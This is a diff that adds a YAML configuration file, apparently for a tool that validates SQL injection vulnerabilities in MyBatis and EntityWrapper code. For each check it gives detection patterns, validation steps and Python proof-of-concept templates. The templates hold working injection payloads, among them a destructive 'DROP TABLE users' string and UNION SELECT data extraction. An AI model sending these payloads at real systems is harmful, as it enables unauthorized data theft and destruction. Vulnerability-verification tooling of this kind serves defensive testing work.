@@ -1,0 +1,141 @@
+methods:
+  sql_injection_mybatis_dollar:
+    id: sql_injection_mybatis_dollar
+    name: MyBatis ${} SQL注入验证
+    vuln_type: sql_injection
+    pattern: "\\$\\{.*?\\}"
+    confidence_level: high
+
+    validation:
+      type: code_analysis
+      steps:
+        - extract_param_from_dollar_brace
+        - find_service_layer_callers
+        - check_hardcoded_values
+        - check_user_controllability
+        - verify_input_validation
+
+    poc_template: |
+      def verify_sql_injection(target_path, param_name):
+          """
+          验证 MyBatis ${} SQL注入漏洞
+
+          测试步骤:
+          1. 构造恶意 SQL payload
+          2. 发送请求
+          3. 检查响应中的异常信息
+          """
+          payloads = [
+              "' OR '1'='1",
+              "' UNION SELECT NULL--",
+              "'; DROP TABLE users--"
+          ]
+
+          results = []
+          for payload in payloads:
+              try:
+                  response = send_request(target_path, {param_name}: payload)
+                  if check_sql_error(response):
+                      results.append({'payload': payload, 'exploitable': True})
+              except Exception as e:
+                  continue
+
+          return {
+              'is_exploitable': len(results) > 0,
+              'evidence': results
+          }
+
+    evidence_required:
+      - service_layer_source
+      - parameter_mapping
+
+  sql_injection_string_concat:
+    id: sql_injection_string_concat
+    name: 字符串拼接 SQL注入验证
+    vuln_type: sql_injection
+    pattern: '".*?"\s*\+'
+    confidence_level: high
+
+    validation:
+      type: code_analysis
+      steps:
+        - detect_string_concat
+        - trace_parameter_origin
+        - check_sql_keywords
+        - check_input_validation
+
+    poc_template: |
+      def verify_concat_sql(target, query):
+          """
+          验证字符串拼接 SQL注入
+
+          测试步骤:
+          1. 分析拼接方式
+          2. 构造 payload
+          3. 测试注入可能性
+          """
+          payloads = [
+              "1' OR '1'='1",
+              "1' UNION SELECT * FROM users--",
+          ]
+
+          results = []
+          for payload in payloads:
+              try:
+                  response = send_request(target, query=payload)
+                  if check_sql_error(response) or check_data_leak(response):
+                      results.append({'payload': payload, 'exploitable': True})
+              except Exception:
+                  continue
+
+          return {
+              'is_exploitable': len(results) > 0,
+              'evidence': results
+          }
+
+    evidence_required:
+      - concat_pattern
+      - parameter_origin
+
+  sql_injection_entity_wrapper:
+    id: sql_injection_entity_wrapper
+    name: EntityWrapper SQL注入验证
+    vuln_type: sql_injection
+    pattern: "EntityWrapper"
+    confidence_level: medium
+
+    validation:
+      type: code_analysis
+      steps:
+        - detect_entity_wrapper_usage
+        - analyze_ew_methods
+        - check_string_concat_in_ew
+        - evaluate_sql_injection_risk
+
+    poc_template: |
+      def verify_entity_wrapper_sql(target, sql_fragment):
+          """
+          验证 EntityWrapper SQL注入
+
+          EntityWrapper 的某些方法可能存在 SQL 注入风险
+          """
+          risky_methods = ['like', 'in', 'eq', 'ne']
+
+          results = []
+          for method in risky_methods:
+              try:
+                  payload = f"{method} '{sql_fragment}'"
+                  response = send_request(target, ew_payload=payload)
+                  if check_sql_error(response):
+                      results.append({'method': method, 'exploitable': True})
+              except Exception:
+                  continue
+
+          return {
+              'is_exploitable': len(results) > 0,
+              'evidence': results
+          }
+
+    evidence_required:
+      - entity_wrapper_usage
+      - method_calls
